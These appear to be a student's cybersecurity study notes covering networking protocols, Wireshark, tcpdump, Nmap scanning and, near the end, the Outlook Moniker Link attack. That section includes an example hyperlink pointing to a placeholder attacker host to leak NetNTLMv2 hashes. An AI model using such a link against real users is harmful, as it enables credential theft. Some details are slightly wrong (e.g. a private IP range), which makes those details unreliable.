# CyberSecurity_2025_Study

20250104
LAN : Local Area Network *already learned at Univ, but studying for reviewing
Topology : referring network's designs

star topology : each devices are indivisually connected via a central network device - switch, hub.
                any information sent to a device sent via central device.
                advantage : Scalable in nature - easy to add more devices.
                disadvantage : high costs, more maintenence required - harder troubleshooting
bus topology : all of connections are connected with a backbone cable, relies on it. backbone cable is branch, other devices are leaf.
                advantage : easier and most cost-efficient topologies to set up
                dis -- : easily bottlenecked so sometimes very difficult to troubleshooting
Ring topology : devices are connected directly to each other and form a loof -> little cabling required, less dependence
                works by sending data across the loop until it reaches the destined device


Switch
Designed to aggregate(모으다) multiple other devices using network-capable devices using ethernet.
Switch based on MAC address - datalink layer, sends data packets in LAN. used in same network
Efficient, bacause it sends data without broadcasting
make network more efficient

Router 
based on IP address - Network layer. route a route, helping data go through another network
connect networks and pass data between them
router : 길잡이.

Hieriachically, Switch has lower position than Router.
Router manages network and outer-network, Switch manages communication into networks.
Router connected with WAN(광역네트워크), Switch connected with LAN

Subnetting : splitting up the number of hosts that can fit within the network - represented by a subnet mask.
IP address composed with 3 parts - Network address / Host address/ Dafault gateway. 
Network address : purposing address
Host address : host's network address
Default gateway : special address assigned to a device on network

ARP - Address Resolution Protocol 
receives network address and returns MAC address - if there's no network address in cache, it broadcasts network address(called ARP request) 
and a device that has corresponding MAC address unicasts ARP (called ARP reply). so device can know next hop address ; next hop's MAC address.

DHCP - Dynamic Host Configuration Protocol
If a device newly connected in a network, a device sends message (DHCP Discover)- requesting IP address.
DHCP server got that message and assign IP address to the device.(DHCP offer)
and the device got the IP address and sends message to DHCP server which means starting using asigned IP address.(DHCP request)
then DHCP server acknowledges message and set the IP address's valid time.(DHCP ACK)

20250126
private IP addresses : 
10.~.~.~ (10.0.0.0 ~ 10.255.255.255)
127.16.0.0 ~ 127.31.255.255
192.168.0.0 ~ 192.168.255.255

TELNET
The TELNET (Teletype Network) protocol is a network protocol for remote terminal connection. It allows you to connect to and communicate with a remote system and issue text commands.
Although initially it was used for remote administration, I can use telnet to connect to any server listening on a TCP port number.

How to use telnet in terminal : telnet (IP address) (port), CTRL + ] when want to stop
Echo server : port 7
Daytime server : port 13
Web(HTTP) server : port 80

Echo server just replying what I typed in
Daytime server immediatly expires after echoing daytime
Web server : Can get informations by typing some keywords
ex) [GET/ HTTP/1.1] -> GET : requiring resources from server, / : requiring server's root directory , HTTP/1.1 : The version of HTTP protocol
--> Meaning "By using HTTP 1.1 protocol, get the root dirctory from server."
[Host : www.example.com] : "I'm requiring to a host which named www.example.com" 

DHCP : Dynamic Host Configuration Protocol
Application layer, relies on UDP.
Server's port is 67 in UDP, Host is 68
Smartphones and laptops are configured to use DHCP by default

DHCP's four steps : DORA - Discover, Offer, Request, Acknowledge
From 0.0.0.0 (host, only has MAC address) Broadcast (255.255.255.255) -> DHCP server's offer -> Host's offered IP address request -> DHCP server's acknowledgement 

ARP uses hexadecimal, so ARP broadcasting's address is ff:ff:ff:ff:ff:ff.

--> Every broadcasting's address is its full address(all the decimal/hexadecimal's numbers are 1)
ICMP Type 8 : echo request

NAT : Network Address Translation
Making many private IP address by using one public IP address.
In internal network, 192.168.0.129 / 15401(port) but in external network it looks like 212.3.4.5 / 19273. 
Its because router's address is 212.3.4.5 and connected devices are differ only by its port number.
ex) A laptop above's internal network adress is 192.168.0.129 and suppose desktop is 192.168.0.125. 
But from external network's view, the laptop's adresss is 212.3.4.5/19273, the desktop's address is 212.3.4.5/32759. 

TCP connection can maintain 65536 connctions at once(theoretically)

20250127
DNS records
DNS traffic uses UDP port 53 by default and TCP port 53 as a default fallback
There are so many DNS records doing but learn about four
A record : maps a hostname to one or more IPv4 addresses. ex)example.com -> 172.17.2.172
AAAA record : similar to the A record but for the IPv6
*AA and AAA are exists, AAA refers to Authentification, Authorization, Accounting.
CNAME record : CNAME (Canoncial Name) record, maps a domain name to another domain name. ex) www.example.com -> example.com or example.org
MX record : MX(Mail Exchange) record specifies the mail server responsible for handling emails for a domain

For look up the IP address, use tool named nslookup. [nslookup example.com]

20250208
Using WireShark, Red word is the text sent by user browser and blue texts are the web server processes.
HTTP is designed to retrieve web pages
FTP(File Transfer Protocol) is designed to transfer files. so FTP is efficient for file transfer

If user want to work FTP:
[ftp (ip address) 21] at terminal
Name : anonymous
no password needed
ls : works same with another commands
type ascii: switches to ascii mode as this is a text file
get ~~~.txt : allows user to retreive(검색) the file user wants
When look with Wireshark, ls transfered LIST command

SMTP commands in telnet
When sending email, User uses email protocol, named SMTP(Simple Mail Transfer Protocol).
SMTP defines how user interact with mail server and how mail server interact with another.
For SMTP using, Some commands are needed:
Starting SMTP : telnet (ip AD) 25
HELO or EHLO initiates an SMTP session -> [HELO client.thm]
MAIL FROM specifies the sender’s email address -> [MAIL FROM: <user@client.thm>]
RCPT TO specifies the recipient’s email address -> [RCPT TO : <strategos@server.thm>]
DATA indicates that the client will begin sending the content of the email message -> [DATA]
. is sent on a line by itself to indicate the end of the email message
-> 
[From: user@client.thm
To: strategos@server.thm
Subject: Telnet email

Hello. I am using telnet to send you an email!
.]

POP3 - Post Office Protocol version 3
designed to allow the client to interact with mail server and retrieve email messages
Email client uses SMTP to send, uses POP3 to retrieve.
Starting POP3 : telnet (ip AD) 110
USER <username> identifies the user
PASS <password> provides the user’s password
STAT requests the number of messages and total size
LIST lists all messages and their sizes
RETR <message_number> retrieves the specified message
DELE <message_number> marks a message for deletion
QUIT ends the POP3 session applying changes, such as deletions

IMAP: Used synchronizing mailbox across multiple devices
allows read/move/delete messages
port : 143
--> telnet (ip AD) 143

Networking Secure Protocol
TLS : Added to existing protocols to protect communication confidentiality/integrity/authenticity.
HTTP/POP3/SMTP/IMAP become HTTPS/POP3S/SMTPS/IMPAS when TLS applied.
A cryptographic protocol opertating at the OSI model's transport layer
Secure communication between server and client even on a insecure network
Ensures no one can read or modify the exchanged data

Difference between HTTPS and HTTP
HTTP's will require two steps - 
1.establish a TCP three-way handshake with the target server
2. Communicate using the HTTP protocol; ex)GET / HTTP/1.1

HTTPS: Establishing a TLS session between step 1 and 2 above
When check the packets with WireShark, HTTPS's some packets are transfered(not on HTTP) 'Application data', so attacker cannot recognize what those packets means
And the stream of packets looks gibberish(헛소리,알아들을 수 없음). No way to know the contents without encryption key.

SMTP/POP3/IMAP is no difference than adding TLS to HTTP. 
When TSL applied, each port numbers changed
HTTPS : 443
SMTPS : 465 / 587
POP3S : 995
IMAPS : 993

SSH
Telnet doesn't have own security system.
SSH : Telnet's secured version. All data encrypted.
Default port : 22
[ssh username@hostname] to connect to SSH server. In case username is same with logged-in username, [ssh hostname]
In kali linux, The argument -X is is required to support running graphical interfaces. ex)[ssh 192.168.124.148 -X]

SFTP
Means SSH File Transfer Protocol and allows secure file transfer.
shares the same port number; 22
can connect by using command [sftp username@hostname]. 
after connection, user can issue commands such as get filename and put filename to download/upload files.
SFTP commands are UNIX-like, not a FTP
SFTP is not same with FTPS

VPN : Virtual Private Network
If user uses VPN, No one can see user's public IP address but the VPN server's.
VPN also allows user's remote access to main branch(geographically far)

By using wireshark, if user know ssl-key.log, then TLS decryption enabled.
then user*attacker can check ID and password.

20250209
-WireShark practice-
WireShark: Analyser tool for sniffing and investigating live traffic and inspecting packet captures
Detecting and troubleshooting network problems / Detecting security anomalies ex)abnormal port usage, suspicious traffic /investigating and learning protocol details
Wireshark is not a intrusion detecting system(IDS). only allows to discover and investigate packets in depth

-WireShark GUI-
When loaded the file, located left-under: packet details, right-under: packet bytes.
Blue shark fin button : start sniffing
packet numbers are not only useful when count a total number of packets but also  in-frame packet tracking 
with 'go' button on toolbar, user can track a packet conviniently.
and 'edit' button on toolbar or ctrl + f, user can find desired contents in packets
when finding packet, knowing input type and choosing the search field(packet list/packet details/packet bytes, 화면 상단/좌하단/우하단) is crucial.
By applying filter user can see same kind of packets. right click->apply as filter.
and conversation filter makes user view only related packets.
colouring filter is almost same with conversation filter but make them easier to detect by colouring them. the color cannot change.
follow TCP/UDP stream : 'red text/blue text' above, following raw traffic streams

20250212
TcpDump
tcpdump's commands
-i : interfaces, Captures packets on a specific network interface [tcpdump -i interface] *at this poing, interface means PC's network connection point
-w : file, Writes captured packets to a file [tcpdump -w FILE]
-r : read, Reads captured packets from a file [tcpdump -r FILE]
-c : count Captures a specific number of packets [tcpdump -c FILE]
-n : dont reslove IP addresses [tcpdump -n]
-nn : don't resolve protocol numbers
ex) tcpdump -i eth0 -c 50 -v
eth0 프로토콜에서 50개의 패킷을 캡쳐한 후 자세한 정보(-v)를 출력하고 종료

Nmap
Since discovering other live devices,
ping won't get any informaion if a firewall blocks ICMP traffic
Arp-scan only works when devices are connceted same network
So Nmap can become a solution.
-How to scan-
IP range using - : 192.168.0.1 ~ 192.168.0.10 : [192.168.0.1-10]
IP subnet using / : [192.168.0.1/24] = [192.168.0.0-255]
Using hostname : specify target with hostname. [example.thm]

-Host scanning-
-sn  = ping scan, scanning local network.
ex) nmap -sn 192.168.66.0/24
only notifies number of online / connected devices
-sL : list scan, shows every detected IPs
[nmap -sL 192.168.0.1/24]

-Port scanning-
Scanning TCP port
The easiest way is attempt to telnet - telnet needs to establish a three-way handshake so it can easily detected
-sT : connect scanning, trying to connect to the target TCP port.
-sS : relatively stealth scanning, only tries first step of three-way handshaking; sends only TCP SYN packet.

Scanning UDP port
-sU : sending UDP packets to all target ports, detecting online ports by ICMP destination unreachable responses

Limiting the target ports
-F : Nmap's mode option, Fast mode. scans 100 most common ports(default 1000)
-p[range] : only scans a range of ports to scan.
ex) -p10-1024 : port 10 to 1024, -p-25 : port 1 to 25.

Os detection
By adding -O option, user can enable OS detection.
ex) [nmap -sS -O (IP ad)]
Service and Version Detection
-sV enables version detection.
an additional column 'VERSION' appears same interface with interface that used -O.
ex) [nmap -sS -sV (IP ad)]
-Pn : scan hosts including didn't reply

20250213
-Exploitation basics-
Moniker Link : approaching outer resource by some protocols ex)wfile:// , http:// ..etc, 
Moniker link Attack in Outlook: An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim,
resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

How Monker link works in Outlook
by using the file:// in hyperlink, Attacker can instruct Outlook to attempt to access a file.
Usually the SMB(Server Message Block) protocol used and requires authentification but Outlook's 'protected view' catches and blocks this attempt
Vulnerability here(thm) exists by modifying hyperlink the ! special character and some text in Attacker's Moniker Link which results in bypassing Outlook’s Protected View. 
ex): <a href="file://ATTACKER_IP/test!exploit>Click me</a>.
by these sequences, attacker can get victim's 'NetNTLMv2 hash'. so attacker can authentificate victim's account. 
*NetNTLMv2 hash: used for network authentification

YARA rule created to detect emails containing file:\\ element in the moniker link.
the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.(by WireShark)

-Metasploit-
The most widely used exploitation framework.
*Payload : the code that will run on the target system to get desired information




